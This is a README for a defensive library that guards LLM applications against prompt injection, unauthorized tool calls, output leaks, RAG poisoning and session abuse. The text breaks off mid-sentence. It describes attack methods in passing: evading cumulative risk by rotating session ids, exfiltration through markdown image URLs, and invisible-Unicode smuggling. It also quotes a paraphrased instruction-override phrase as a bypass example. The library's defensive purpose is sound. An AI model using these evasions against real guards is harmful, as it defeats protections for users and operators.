# llm_security_pipeline

A defensive pipeline for LLM-based applications: direct and indirect prompt
injection, unauthorized tool calling, output/PII/secret leaks, and
session-level abuse (DoS, multi-turn jailbreak build-up). This version is
async and Redis-backed, built for multi-process/multi-pod cloud deployments.

## Structure

- `services/sanitizer.py` – Unicode normalization, encoded-payload
  detection, explicit data-wrapping, multilingual lexical heuristics
  (IT/EN/ES/FR/DE/PT). Pure CPU, no I/O — safe to run in a worker process.
  `Sanitizer` holds a compiled `PatternRegistry` (same
  `pattern_config_path`/`include_default_patterns`/`registry` constructor
  shape as `OutputGuard` below); `scan_text` is a convenience wrapper over
  a lazily-created default instance.
- `services/scope_guard.py` – signed capability tokens (HMAC-SHA256) with
  scope, TTL and anti-replay for gating agent tool calls. Async; delegates
  replay tracking to a pluggable `NonceStore`.
- `services/output_guard.py` – credential/PII detection and system-prompt
  leak detection. Patterns come from `config_loader.py` /
  `config/patterns.json`.
- `services/rate_limiter.py` – per-session request/tool-call budget and
  cumulative cross-turn risk tracking. Async; delegates counters to a
  pluggable `SessionStore`.
- `config_loader.py` – loads and validates secret/PII/injection-phrase
  regex patterns from external JSON, extensible without touching library
  code.
- `sessions/stores.py` – backend-agnostic interfaces (`NonceStore`,
  `SessionStore`) for the pipeline's shared mutable state, plus in-memory
  implementations for local development, unit tests and single-process
  deployments.
- `sessions/redis_stores.py` – Redis implementations of those interfaces,
  using atomic Lua scripts so state is correct under concurrent access
  from multiple processes. Requires the optional `redis` extra.
- `sessions/postgres_stores.py` – PostgreSQL implementations, using atomic
  single-statement upserts (`INSERT ... ON CONFLICT ... RETURNING`) with
  logical TTL columns and opportunistic cleanup. Requires the optional
  `postgres` extra (asyncpg).
- `sessions/mysql_stores.py` – MySQL/MariaDB implementations: single-statement
  `LAST_INSERT_ID()` upserts for integer counters, and a locked
  transaction with bounded deadlock retry (InnoDB error 1213) for the
  float risk accumulator. Requires the optional `mysql` extra (aiomysql).
- `state_backend.py` – `StateBackend`, the technology-neutral bundle of
  stores the pipeline consumes, with three ready-made implementations:
  `RedisStateBackend`, `PostgresStateBackend` and `MySQLStateBackend`.
  Implement the two interfaces in `sessions/stores.py` on anything else
  (e.g. DynamoDB) to use a different technology with no changes elsewhere.
- `pipeline.py` – async orchestrator (`SecurityPipeline`), with structured
  audit logging (stdout JSON by default, Redis Streams optional) and a
  `ProcessPoolExecutor` for the batch-scanning workload that actually
  benefits from multi-core parallelism.

## Why this needed a rewrite for production

The original single-process version kept its rate-limit counters and
token-replay tracking in plain Python dicts. That is only safe if your
application runs as exactly one process forever. In any real cloud
deployment — multiple gunicorn/uvicorn workers, multiple pods behind a load
balancer, autoscaling — different requests land on different processes,
each with its own private copy of those dicts. Concretely, this means:

- A capability token with `max_uses=1` could be redeemed once **per
  process** instead of once total — an attacker (or a buggy retry) hitting
  N different pods gets N uses out of a "single-use" token.
- A session's request budget or cumulative jailbreak-risk score would only
  see the fraction of traffic that happened to land on one process,
  silently multiplying the effective limit by the number of instances.

This was verified directly, not just reasoned about:
`tests/test_token_replay.py` spawns 5 separate OS processes that all race
to redeem the same single-use token, against each of the three backends in
turn. With the old in-memory store, all 5 succeed (the bug). With
`RedisNonceStore` (from `sessions/redis_stores.py`), exactly 1 succeeds and
the other 4 are correctly denied as replay attempts — atomicity is
enforced by Redis executing each check-and-increment as a single
uninterruptible Lua script, not by Python-level locking (which can't help
across separate processes anyway). The PostgreSQL and MySQL backends give
the same guarantee via their own atomic primitives (see
`sessions/postgres_stores.py` / `sessions/mysql_stores.py`).

## Installation and packaging (uv, src layout)

This is a **library**, consumed by your application — it has no Dockerfile
or deployment of its own. It uses `pyproject.toml` with uv (no
`requirements.txt`) and the `src` layout:

```
project-root/
├── pyproject.toml
├── uv.lock
└── src/
    └── llm_security_pipeline/
        ├── __init__.py
        ├── ... (all modules)
        └── config/
            └── patterns.json    # must live INSIDE the package: config_loader.py
                                 # resolves it relative to its own __file__
```

The package directory must be `src/llm_security_pipeline/`, not loose
modules in `src/`: with hatchling, the last path component of `packages`
becomes the installed package name, so loose files in `src/` would install
a package literally named `src` (name collisions guaranteed the moment two
libraries do the same). Common commands:

```bash
uv sync                  # create .venv, install from lockfile (dev)
uv run pytest            # run tests in the managed environment
uv build                 # produce the wheel + sdist in dist/
unzip -l dist/*.whl | grep patterns.json   # verify the config file made it in
```

All shared-state backends are **optional extras**, not hard dependencies:

```bash
uv add llm-security-pipeline              # base: in-memory stores only
uv add "llm-security-pipeline[redis]"     # Redis backend
uv add "llm-security-pipeline[postgres]"  # PostgreSQL backend (asyncpg)
uv add "llm-security-pipeline[mysql]"     # MySQL/MariaDB backend (aiomysql)
```

Note that `uv.lock` pins versions for *this repo's* development and CI
only; consumers of the library resolve against the version ranges declared
in `pyproject.toml`, as is correct for a library.

## Do you actually need Redis?

Not always. The decision depends on **how many Python processes share the
limits being enforced**, not on how many machines you have:

- **No Redis needed** — local development and tests (the in-memory stores
  are the default), single-process deployments (a CLI tool, a bot with one
  worker, a prototype), or any usage that only touches the stateless parts
  of the pipeline (input sanitization, external-content scanning, output
  guard) without capability tokens or session rate limiting.
- **Redis required** — anything with more than one process serving the
  same traffic: `uvicorn/gunicorn --workers N` with N > 1 (yes, even on a
  single VM — that is already N independent processes), multiple pods
  behind a load balancer, autoscaling, serverless. The failure mode
  without it is silent and demonstrated in `tests/test_token_replay.py`
  and `tests/test_rate_limit.py`: each process keeps private counters, so
  a `max_uses=1` token redeems once *per process* and session budgets
  multiply by the instance count, with no error anywhere.
- **Alternatives to Redis** — `PostgresStateBackend` and `MySQLStateBackend`
  are ready-made if you already run one of those; for anything else, the
  `NonceStore`/`SessionStore` interfaces in `sessions/stores.py` are
  abstract precisely so you can back them with DynamoDB (conditional
  writes) or similar, at the cost of somewhat higher per-operation
  latency; bundle your implementations in a `StateBackend` and pass it to
  `SecurityPipeline(state_backend=...)`. Sticky sessions at the load balancer are **not** a substitute:
  they are fragile under pod churn and do nothing against token replay,
  which can arrive outside the session's process.

## Quick start (production)

```python
from llm_security_pipeline import SecurityPipeline, RedisStateBackend

async def handle_request(user_message: str, session_id: str, retrieved_chunks: list[str]):
    async with SecurityPipeline(
        system_prompt=SYSTEM_PROMPT,
        state_backend=RedisStateBackend.from_url("redis://redis-service:6379/0"),
        pii_config_path="config/my_org_patterns.json",
    ) as pipeline:

        pre = await pipeline.pre_process(user_message, session_id=session_id)
        if pre.blocked:
            return "Request blocked for security reasons."

        chunks = [(text, f"rag:{i}") for i, text in enumerate(retrieved_chunks)]
        external = await pipeline.pre_process_external_batch(chunks)  # parallelized across CPU cores

        model_output = await call_llm(build_prompt(pre.sanitized, external))

        post = await pipeline.post_process(model_output)
        return post.safe_text
```

In a long-lived service, construct `SecurityPipeline` once at startup
(reusing one backend/connection pool and one process pool across requests)
rather than per-request; `async with` in the example above is for
demonstration. Call `await pipeline.aclose()` on shutdown.

## Testing

Tests live in `tests/` and run with pytest (`asyncio_mode = "auto"`, see
`pyproject.toml`):

- `test_redis_cluster_keys.py` – the Redis Cluster key layout: slot
  invariants computed locally (no server needed) plus, when a
  cluster-enabled Redis is reachable at `REDIS_CLUSTER_URL`, the same
  operations against a real one — including a test that the *old* key
  layout is genuinely rejected, so the hash tags can't quietly stop
  being load-bearing.
- `test_risk_weights.py` – the scoring knobs, including a measured
  demonstration of the recall/false-positive trade they control.
- `test_identity_binding.py` – token subject binding, principal-keyed
  session state, and the actor accumulator. Includes a test that documents
  the residual gap: with no principal and no actor id, rotating the session
  id defeats cumulative risk entirely.
- `test_ingest_guard.py` – ingest verdicts, trust tiers, and provenance:
  in particular that content modified *after* a clean ingest is detected at
  retrieval, and that "never ingested" is reported differently from
  "tampered".
- `test_media_guard.py` – the extractor seam: plugged-in output is scanned
  like ordinary text, a failing extractor degrades visibly rather than
  reporting clean, and media risk feeds the same session budget as text.
- `test_evaluation.py` – the threshold sweep and shadow mode.
- `test_exfil_guard.py` – side-channel URL detection: zero-click channels,
  payload shapes, allowlist behaviour, and the pipeline wiring for both
  output and tool arguments.
- `test_unicode_smuggling.py` – Unicode Tag-block and bidi handling,
  including that the hidden run reaches the lexical scan and is gone from
  the text handed to the model.
- `test_in_memory_stores.py` – plain unit tests for
  `InMemoryNonceStore`/`InMemorySessionStore`: no infrastructure, no
  `ProcessPoolExecutor`, just the single-process logic they're actually
  meant for (counter increments, window reset, risk decay/flagging,
  session reset).
- `test_redaction.py` – that a detected secret cannot reach the user.
  Covers patterns with zero, one and two capture groups (`findall` reports
  groups rather than whole matches, which used to let every occurrence
  after the first through unredacted), repeated matches, and findings that
  overlap each other.
- `test_metrics.py` – that the numbers a person would act on actually come
  out (the shadow comparison, both risk scores separately, per-detector
  distributions), and that the cardinality guard holds: every forbidden
  label parametrized, and an assertion that the pipeline's own call sites
  never make the guard fire in the first place.
- `test_detectors.py` – the socket, not a model: detectors are functions
  returning a number. Covers advisory-by-default, that max does not become
  a sum, that a failed detector is excluded rather than scored zero (with
  an averaging combiner to prove the difference is real), and that a sync
  detector does not block the event loop.
- `test_streaming_guard.py` – every case fed at four chunk sizes including
  one character at a time, because a seam bug shows up at one size and not
  another. Asserts on what was *emitted* rather than on what was detected,
  since detection after emission is not a save, and pins the equivalence
  between a streamed and a buffered response so the choice of transport
  does not become a security decision.
- `test_failure_policy.py` – stores that raise and stores that hang, per
  operation: that the policy is obeyed, that a domain exception is never
  mistaken for a backend failure, that cancellation is not converted into a
  security decision, that the breaker stops calling a dead backend and lets
  one call through after recovery, and above all that no fail-open decision
  is silent.
- `test_key_rotation.py` – the three-step rotation walked end to end,
  asserting that a token issued before each step still verifies after it,
  plus both ways of getting the order wrong, and that the key id is
  untrusted input rather than a hint.
- `test_token_serialization.py` – the `to_str`/`from_str` round trip
  across two independently constructed guards, malformed and oversized
  input, an edited payload failing verification, and the warning and error
  message produced when a guard is using a process-local key.
- `test_input_limits.py` – the size cap, including that a payload placed
  past it does not earn a clean verdict, and both branches of charging
  external-content risk to a session.
- `test_config_loader.py` – plain unit tests for `PatternRegistry`: default
  loading, override-by-name and add-alongside semantics, and every
  `PatternConfigError` path (malformed JSON, missing file, missing
  fields, unknown flag, invalid regex, zero patterns).
- `test_sanitizer.py` – plain unit tests for `scan_text`/`Sanitizer`:
  multilingual phrase matching (by config-defined name, not raw regex
  text), the code-mixing score bonus, encoded-payload detection, the
  block threshold, and `Sanitizer`'s override knobs (custom
  `pattern_config_path`, `include_default_patterns=False`, an explicit
  `registry`).
- `test_token_replay.py` – 5 real OS processes race to redeem the same
  `max_uses=1` capability token; asserts exactly 1 succeeds. Parametrized
  over all three backends (`redis`, `postgres`, `mysql`) — each is
  supposed to provide the identical guarantee on different technology.
- `test_rate_limit.py` – 6 real OS processes each send 1 request against a
  shared session budget of 3; asserts exactly 3 are allowed. Same
  three-backend parametrization as the token-replay test.
- `test_parallel_scanning.py` – asserts a batch scanned via
  `ProcessPoolExecutor` matches a sequential scan of the same chunks,
  including a deliberately injected malicious one. Redis-only: this test
  is about CPU parallelism, not about the state backend.
- `test_end_to_end.py` – exercises `SecurityPipeline` front-to-back: a
  benign message, indirect injection in external content, and a leaked
  secret in model output. Redis-only, for the same reason.

The cross-process tests are marked `@pytest.mark.integration` plus one of
`@pytest.mark.redis` / `postgres` / `mysql`: they need a reachable
instance of that backend (real cross-process state, not an in-memory
stand-in) and spawn real OS processes, so they don't fit the "unit test"
label despite using `assert`. `tests/conftest.py` checks reachability for
each backend once at collection time and skips only the parametrized
cases for backends that aren't reachable — so, for example, running with
only Redis up still exercises the Redis cases and cleanly skips the
PostgreSQL/MySQL ones instead of failing.

Lint and type checking run as their own CI job and are reproducible
locally with `make lint` (ruff + mypy, both configured in
`pyproject.toml`). Ruff is deliberately configured as a bug-finding gate
rather than a formatter: the pyflakes/bugbear/bandit families are on, the
stylistic ones are not, because a lint job whose output is mostly noise is
one people learn to skip.

```bash
uv sync --extra redis --extra postgres --extra mysql   # drivers used by the test suite

docker run -d --rm -p 6379:6379 redis:7-alpine
docker run -d --rm -e POSTGRES_PASSWORD=postgres -p 5432:5432 postgres:16-alpine
docker run -d --rm -e MYSQL_ALLOW_EMPTY_PASSWORD=yes -e MYSQL_DATABASE=test -p 3306:3306 mysql:8

uv run pytest
```

Override `REDIS_URL` / `POSTGRES_DSN` / `MYSQL_HOST` (+ `MYSQL_PORT`,
`MYSQL_USER`, `MYSQL_PASSWORD`, `MYSQL_DB`) if your instances aren't on
the defaults above. `uv run pytest` is always safe to run even with no
backend available at all — every integration case skips instead of
failing, and the unit tests still run and report real coverage on the
in-memory stores.

## Deployment notes

- **Redis**: any managed Redis (ElastiCache, Memorystore, Azure Cache,
  Redis Cloud) works; no special modules required beyond stock Redis
  (`EVAL`/Lua scripting is core functionality). Use a dedicated logical DB
  or key prefix per environment to avoid staging/prod key collisions —
  `RedisNonceStore`/`RedisSessionStore` accept a `key_prefix` argument.
- **Redis Cluster**: supported, and it needs no configuration.

  ```python
  backend = RedisStateBackend.from_cluster_url("redis://redis-cluster:6379")
  # or pass a RedisCluster client you already manage:
  backend = RedisStateBackend(my_cluster_client)
  ```

  The reason this needs handling at all: a cluster shards the keyspace into
  16384 hash slots, and a Lua script may only touch keys in one slot.
  `add_risk` updates `risk`, `risk_last` and `flagged` together, so under
  plain `prefix:<session_id>:<field>` naming the server rejects the call
  with CROSSSLOT before executing anything. Session keys are therefore
  wrapped in a hash tag — `sentinel:session:{<session_id>}:risk` — which
  pins one session's keys to one slot while spreading sessions across the
  cluster. The topology is detected on first use (`INFO cluster`, or free
  of charge when the client is already a `RedisCluster`) and cached, so a
  single-node deployment keeps its existing key layout and a cluster gets
  tagged keys, with the same code either way.

  Overrides, for the cases where detection is not what you want:
  `hash_tags=True` (always tag — valid on a single node too, since braces
  are ordinary characters there) or `hash_tags=False` (never tag; raises at
  first use if the client is a cluster client, rather than letting a
  CROSSSLOT surface later inside the guard path). If `INFO` is restricted
  by your provider, detection logs a warning and tags, because tagged keys
  are correct on both topologies.

  Two things to know before switching an existing deployment: keys change
  name, so in-flight session counters and risk scores start from zero once
  (all of it is TTL'd ephemeral state — nonce keys are deliberately *not*
  renamed, so anti-replay is unaffected); and `key_prefix` must no longer
  contain braces, which is rejected at construction. A brace in the prefix
  is the first brace group in the key and would beat the per-session tag,
  collapsing every session into one slot. If you applied the manual
  `{session_id}`-in-`key_prefix` workaround this README previously
  suggested, remove it.
- **Capability-token signing key**: `SecurityPipeline(scope_secret_key=...)`
  must be the same value in every process. Left unset, `ScopeGuard`
  generates a random key private to the process it runs in, which is
  correct for a single-process app and silently wrong for anything else:
  a token issued on one pod fails verification on every other one, and the
  error says "possible tampering" about a token nobody tampered with. Both
  the guard and the pipeline log a warning when this happens, and the
  signature error explains itself when the key is process-local — but the
  fix is to pass the key from your secret manager.
- **Connection reuse**: pass one shared `redis.asyncio.Redis` client (which
  manages its own connection pool) to `RedisStateBackend(redis_client)`
  rather than letting every request open a new connection.
- **Process pool sizing**: defaults to `os.cpu_count()` workers. Size it to
  your container's actual CPU allocation/limit, not the host's — on
  Kubernetes with CPU limits, `os.cpu_count()` reports the *node's* core
  count, not your pod's quota, and can over-provision workers. Pass
  `process_executor=ProcessPoolExecutor(max_workers=N)` explicitly if you
  set CPU limits.
- **Graceful shutdown**: always call `pipeline.aclose()` (or use
  `async with`) so the process pool's worker processes and the Redis
  connection are released cleanly on deploy/restart.
- **Redis Streams audit log**: `RedisStreamAuditLogger` is capped with
  `maxlen` (approximate trimming) so it doesn't grow unbounded; for durable
  long-term storage, consume the stream into your log/SIEM pipeline rather
  than relying on Redis itself as the archive.

## Where the parallelism actually is (and where it deliberately isn't)

This is the part most likely to be over-engineered if done carelessly, so
here is the reasoning, not just the result:

| Operation | Bound by | Strategy | Why |
|---|---|---|---|
| Redis reads/writes (budget check, risk update, token replay check) | I/O | `asyncio` + `asyncio.gather` | Network round-trips are naturally concurrent; no GIL contention. |
| Single direct user message scan | CPU (regex) | Inline, synchronous | For typical message sizes this takes microseconds; a process-pool round trip (serialize args, queue, deserialize result) costs more than the work itself. Offloading it would make the common case *slower*. |
| Batch of external/RAG content chunks | CPU (regex), several independent items | `ProcessPoolExecutor` via `run_in_executor`, gathered | This is the one place where the CPU work is large enough, and split into genuinely independent units, that spreading it across real OS processes (bypassing the GIL) pays for itself. Below `external_scan_parallel_min_chunks` (default 2) it still runs inline. |
| Very large pasted input (> `large_input_offload_threshold_chars`, default 20,000 chars) | CPU (regex) | Offloaded to the process pool | Large enough that the regex work dominates the IPC overhead. |
| High request throughput in general | — | Run multiple OS processes of *your application* (uvicorn/gunicorn workers, multiple pods) | This is the standard way Python achieves multi-core throughput for many concurrent requests, and it's exactly why the Redis-backed shared state exists: so those independent processes agree on one set of limits instead of each enforcing its own. |

A single-core sandbox can't demonstrate a speedup, so
`tests/test_parallel_scanning.py` verifies the parallel batch path for
**correctness** (its output matches sequential execution) rather than for
speed. On a real multi-core host, the same code parallelizes across cores
without any changes.

## Extending patterns via config.json

Secret, PII **and** multilingual injection-phrase patterns all live in
`config/patterns.json` and share the same override mechanism, via
`config_loader.py`'s `PatternRegistry`: an entry in a custom file with the
same `name` as a bundled default REPLACES it, a new `name` is added
alongside the rest. `injection_patterns` entries carry one extra required
field, `lang`, since that heuristic groups by language (used for the
code-mixing signal in `scan_text`) — otherwise they're the same
`{name, pattern, flags}` shape as `secret_patterns`/`pii_patterns`.

- `OutputGuard`/`SecurityPipeline(pii_config_path=..., include_default_pii_patterns=...)`
  picks up custom secret/PII patterns.
- `Sanitizer`/`SecurityPipeline(injection_config_path=..., include_default_injection_patterns=...)`
  picks up custom injection phrases, the same way. `Sanitizer` mirrors
  `OutputGuard`'s constructor exactly: `pattern_config_path`,
  `include_default_patterns`, or a pre-built `registry` for full control.
  The module-level `scan_text` function is a thin convenience wrapper
  around a lazily-created default `Sanitizer()` for callers who don't need
  any of that.

Every entry is validated against a pydantic schema before it's compiled:
required fields (`name`/`pattern`, plus `lang` for injection entries),
unknown fields rejected (`extra="forbid"`), unknown flag names, and
regex syntax — all reported as a `PatternConfigError` pointing at the
exact entry (e.g. `secret_patterns.2.pattern`) rather than surfacing as a
confusing error somewhere in the scanning path, or a pattern silently not
applying at all. `pydantic` is consequently a **required** dependency of
this library (not an extra like `redis`/`postgres`/`mysql`): pattern
loading always runs, for every install, regardless of which shared-state
backend you pick.

See the module docstring in `config_loader.py` for the exact schema.

## Threat coverage

**Covered:**
- Direct and indirect prompt injection
- Unauthorized tool calling (scope-gated capability tokens)
- Secret/PII/system-prompt leakage in model output
- DoS/cost-abuse via excessive requests or tool calls (session budget)
- Multi-turn jailbreak build-up (cumulative session risk)
- Exfiltration through rendered side channels — markdown/HTML image and
  media URLs, CSS `url()`, and URLs passed as tool-call arguments
- Instructions smuggled in invisible codepoints (Unicode Tags block,
  directional overrides)
- **Correctness of all of the above under multi-process/multi-pod
  deployment**

- Knowledge-base/RAG poisoning at ingestion, with provenance verification
  at retrieval
- Non-text carriers, through pluggable extractors (metadata and embedded
  strings out of the box; OCR is yours to supply)

- Rotating the token signing key without a window in which valid tokens
  are rejected
- Measuring all of the above — shadow-mode deltas, score distributions,
  detector calibration — as aggregate metrics with no identifiers in them
- Plugging in a model-based detector to cover the paraphrase gap the
  lexical heuristics leave open, without shipping a model
- Scanning a response while it streams, without emitting anything that has
  not been seen whole
- Deciding, per guard, whether an unreachable state backend means "refuse"
  or "proceed unchecked" — and making the second one visible when it
  happens
- Binding tokens and session state to an authenticated end user, when your
  gateway supplies one, plus risk accumulation that survives session
  rotation when it does not

**Still NOT covered:**
- **Authenticating anyone.** The library receives a principal, it cannot
  verify one. That belongs at your gateway and no future version will
  change it — see *Identity* below for exactly where the boundary falls.
- **Object-level authorization.** Whether account 42 belongs to this user
  is a question about your data model. The library transports and verifies
  signed constraints; the policy stays in your tool.
- Text rendered as pixels, unless you plug in OCR. See *Non-text input*.
- Any guarantee against a sufficiently novel attack. No code produces one.
  What the library now provides instead is the means to measure: see
  *Tuning the thresholds*.

### Identity

`session_id` is a string the caller supplies. Nothing here can verify it,
and that has a sharp consequence: rotating it resets the cumulative risk
score, so the multi-turn defence is worth exactly as much as that string
is hard to change. Every other omission in this library fails loudly — a
missing provenance store raises, a cluster with the wrong key layout
raises — this one degrades in silence, with counters counting and logs
filling up while protecting nothing.

So the posture has to be declared. Leaving it undeclared logs a warning at
construction.

```python
# You have a gateway that authenticates users
pipeline = SecurityPipeline(session_identity="authenticated")
await pipeline.pre_process(msg, session_id=sid, principal=user_id)

# You do not — accept it knowingly, and give risk somewhere stable to land
pipeline = SecurityPipeline(session_identity="untrusted")
await pipeline.pre_process(msg, session_id=sid, actor_id=api_key_id)
```

**What a principal buys you.** Session state is keyed to it, so guessing
someone's `session_id` inherits none of their budget or accumulated risk.
Capability tokens are issued with a `subject` inside the signature and can
only be spent by that subject, which is what makes a leaked token useless
to whoever finds it — the confused-deputy case, where the agent acts with
the token's authority regardless of who is asking now. Under this posture
unbound tokens are refused at issuance. The audit trail records the
principal, so incident response does not depend on a join through an
unverifiable key.

**What an `actor_id` buys you without any of that.** A second, coarser
accumulator — account, API key, tenant, source address — with a higher
threshold and a longer TTL. It does not need to be unforgeable; it only
needs to be more expensive to change than the session id. Without one,
`tests/test_identity_binding.py` demonstrates the evasion: ten identical
attacks across ten fresh session ids, none blocked. With one, the same
sequence trips the actor threshold.

**Object-level scope** is where the library stops. It can carry signed
constraints and check them for you:

```python
token = guard.issue_token(agent_id="bot", scopes=["read_crm"],
                          subject=user_id, constraints={"account_id": "42"})
guard.check_constraints(token, account_id=requested_account)   # raises on mismatch
```

That answers "does this call match what the token was issued for", which
is cryptographic and therefore ours. It does not answer "should this user
be near account 42", which is your data model and stays in your tool.

**Moving a token between services.** `to_str()` serializes a token and
`CapabilityToken.from_str()` parses it back, which is what makes the
issue-here/spend-there split possible in the first place:

```python
token = guard.issue_token(agent_id="bot", scopes=["read_crm"], subject=user_id)
wire = token.to_str()                       # hand to the caller, queue, header

parsed = CapabilityToken.from_str(wire)     # in the other process
await guard.authorize(parsed, "read_crm", subject=user_id)
```

The serialized form is encoded, not encrypted: anyone holding it can read
the scopes and the subject. What the signature guarantees is that they
cannot change them. `from_str` raises `ScopeError` for every malformed
input rather than leaking a `ValueError` or a `JSONDecodeError`, and
refuses anything over 16 KB before parsing it, since it runs on untrusted
strings. The signature is verified over the bytes the token arrived as
rather than over a re-serialization of the parsed payload, so verification
does not quietly depend on your JSON encoder producing byte-identical
output to the issuer's.

### Rotating the signing key

A capability token is signed once and verified later, possibly in another
process, and stays valid for its TTL. With a single key there is no way to
change it without a window of failures: the instant one process starts
signing with a new key, every token already in flight becomes "possible
tampering" everywhere else. That is not a key you can rotate, which means
in practice it is a key nobody rotates.

So keys are named. `kid` travels inside the signed payload, verification
looks it up, and a guard holds several keys while signing with exactly one:

```python
from llm_security_pipeline import SecurityPipeline, SigningKeyring

keyring = SigningKeyring.single(current_key, kid="2026-01")
pipeline = SecurityPipeline(scope_keyring=keyring)
```

Rotation is then three deploys and no window:

```python
keyring = keyring.with_key("2026-02", new_key)   # 1. everyone accepts it
keyring = keyring.with_active("2026-02")         # 2. now it signs
keyring = keyring.without_key("2026-01")         # 3. after the longest TTL
```

**The order is load-bearing, not stylistic.** Promote before step 1 has
finished rolling out and a token signed by an updated process reaches one
that has never heard of that key id. Retire before every token naming the
old key has expired and those tokens stop verifying. Both are the same
failure the single-key case forces on you, so both raise `UnknownKeyId`
naming the key rather than a generic signature error — the message
distinguishes them, and `with_active`/`without_key` refuse locally
detectable versions of each (promoting a key that is not accepted,
retiring the active one).

Knowing when step 3 is safe is a question about traffic, not about the
clock, so `token_key_id` is on every `tool_call` audit event: the old key
can go once no spent token has named it for longer than the longest TTL you
issue.

`scope_secret_key=` is still there and is shorthand for
`SigningKeyring.single(key)` under the id `"default"` — fine until the
first rotation, at which point that id joins the keyring like any other.
Keys shorter than 32 bytes are refused rather than documented against, and
key ids are restricted to `[A-Za-z0-9._:-]` because they end up in JSON
payloads, error messages and log lines that something else parses.

The `kid` is attacker-controlled before verification, so it is used to
index a dictionary and nothing else. There is deliberately no
try-every-key fallback: that would make each verification a search over the
whole keyring and let a retired key behave like a current one. Editing the
`kid` breaks the signature, and would not help anyway, since producing a
signature under the key it was repointed at is the part an attacker cannot
do.

### Ingestion-time scanning (`IngestGuard`)

`pre_process_external` scans retrieved content at query time, which is the
right last line of defence and the wrong place to catch poisoning. By then
the malicious chunk is indexed, returned for every similar query, and
rescanned on every retrieval — and retrieval-time scanning only ever sees
the top-k that came back, so a document planted months ago and surfacing
for one specific question is never examined until the day it works.

```python
verdict = await pipeline.ingest_document(
    page_text, document_id="wiki:1024", source_id="scraped:example.com", trust="untrusted",
)
if verdict.accepted:
    index.add(page_text, metadata={"document_id": "wiki:1024"})
else:
    review_queue.put(verdict)          # "quarantine" or "reject"
```

Three things this adds over running the sanitizer earlier by hand. It
produces a **verdict** (accept / quarantine / reject) rather than
sanitizing and continuing, because at ingest nothing is waiting on the
answer. It applies **trust tiers**, so a curated wiki and a scraped forum
thread are not held to one threshold — the untrusted tier quarantines on a
single injection phrase, which would be far too twitchy at runtime and is
close to free at ingest. And it records **provenance**:

```python
check = await pipeline.verify_retrieved(chunk_text, document_id="wiki:1024")
if check.tampered:      # content changed since it was approved
    ...
```

That last one catches what scanning cannot: content that was clean when
indexed and was modified afterwards, in the vector store, by someone who
already has write access to it. It needs a `ProvenanceStore`, and all
three ready-made backends provide one — Redis, PostgreSQL and MySQL — with
`InMemoryProvenanceStore` for a single process and a three-method
interface for anything else. It is not defaulted to in-memory on purpose:
a provenance store that forgets on restart turns verified retrievals into
unverified ones with nothing failing.

Provenance rows are the one piece of state here without a TTL. Every other
table is an expiring counter; a provenance record has to outlive whatever
session retrieved the document, because an expired record is
indistinguishable from a document that was never scanned. Deleting one
belongs with deleting the document from your index.

Batch ingestion (`ingest_batch`) parallelizes scanning across the process
pool on the same terms as `pre_process_external_batch`.

### Non-text input (`MediaScanner`)

No OCR engine is bundled, and that is a considered choice rather than a
gap left for later. Tesseract would add tens of megabytes and a per-image
CPU cost, and would still miss the low-contrast, rotated and stylised text
this attack actually uses — producing a guard that reports "clean" on
exactly the inputs it is least able to read. That is worse than no guard,
because it is a guard people trust.

So extraction is yours and scoring is ours:

```python
scanner = MediaScanner(extractors=[
    BinaryStringsExtractor(),                      # bundled, no dependencies
    ExifExtractor(),                               # bundled, needs [images]
    CallableExtractor("vision", my_vision_client), # yours
])
result = await pipeline.pre_process_media(image_bytes, "image/png", "upload:42", session_id=sid)
```

Synchronous extractors run on a thread pool rather than on the event loop
— including a synchronous callable wrapped in `CallableExtractor`, which
is async on the outside and would otherwise stall every other request in
the process while it decodes. Pass `executor=` to bound how many images
are decoded at once. Anything an extractor returns goes through the
ordinary sanitizer, scores on the same scale, and feeds the same
cumulative session risk — so an
attack split across a message and an image does not get two independent
budgets. A failing extractor is recorded in `extractor_errors` and the
others still run; a scan where everything failed reports 0.0 *with the
errors attached*, because "nothing was read" and "nothing was there" must
not look alike.

### Metrics

Three things in this library produce numbers whose entire purpose is to be
looked at before a decision is taken: shadow mode records what enforcement
*would* have done, an advisory detector runs so you can see its scores, and
every threshold is documented as a product decision to be measured rather
than a fact. All of that lands in the audit stream, which is a log — good
at "what happened to this request", useless at "what is the distribution of
risk scores this week and where should the threshold go".

```python
from prometheus_client import start_http_server
from llm_security_pipeline import PrometheusMetricsSink, SecurityPipeline

start_http_server(9100)
pipeline = SecurityPipeline(metrics=PrometheusMetricsSink())
```

Needs the extra: `pip install "llm-security-pipeline[metrics]"`. Off by
default — the default sink does nothing. `InMemoryMetricsSink` is there for
tests and for anyone who wants the numbers without running a Prometheus,
and `MetricsSink` is a two-method protocol if you have your own.

The series worth building a dashboard on first:

| Metric | What it answers |
| --- | --- |
| `would_block_total` vs `blocks_total` | What enforcement would do if you switched shadow mode off. The whole point of shadow mode, and currently the reason people grep logs. |
| `risk_score{kind}` | The score distribution, split into the lexical score and the score the decision was actually taken on. Tuning a threshold against the wrong one of those is easy to do. |
| `detector_score{detector,mode}` | Whether an advisory detector is ready to enforce. |
| `detector_errors_total` | A detector that did not answer contributes nothing rather than zero, so a rise here means the ensemble is quietly weaker without any score moving. |
| `degradations_total{decision="open"}` | Requests served with part of the checking skipped. |
| `findings_total{category}` | Which patterns earn their place and which only ever fire on false positives. |
| `stream_leaks_total` | Should be zero. If it isn't, `holdback_chars` is smaller than something your patterns can match. |

**The metrics sink is synchronous, unlike the audit logger.** That is not
an oversight: it sits on the hot path of every request, and making it
awaitable invites implementations that do I/O there. A sink increments
something in memory and returns; if yours needs the network, buffer and
flush from a background task.

**There is no failure policy for metrics.** Every other backend has one
because for every other backend both answers are defensible. Refusing a
user's request because a counter could not be incremented is never right, a
knob whose only sensible setting is "open" should not exist, so a sink that
raises is swallowed and logged once.

**Identifying labels are refused, not discouraged.** `session_id` on a
metric does two bad things at once: it makes the series cardinality
unbounded, which is the classic way to take a Prometheus server down, and
it copies an identifier out of the audit log — access-controlled, retained
deliberately — into a metrics backend that is usually readable by the whole
engineering org. Documenting "don't" is not a mechanism, so the names in
`FORBIDDEN_LABELS` are dropped at the sink with a warning, the measurement
itself is kept, and the warning fires once rather than per request.

### Semantic detectors

Everything else here decides by shape: a pattern matched, a codepoint was
invisible, a base64 blob decoded into an instruction. That is bypassed by
paraphrasing, as this README says elsewhere — *"kindly set aside the
guidance you were given earlier"* is in no phrase list, and adding it only
moves the problem to the next wording.

Closing that gap needs a model, and this library does not ship one. Same
position `MediaScanner` takes about OCR: extraction is yours, scoring is
ours. Bundling a classifier would pin a runtime, a set of weights and a
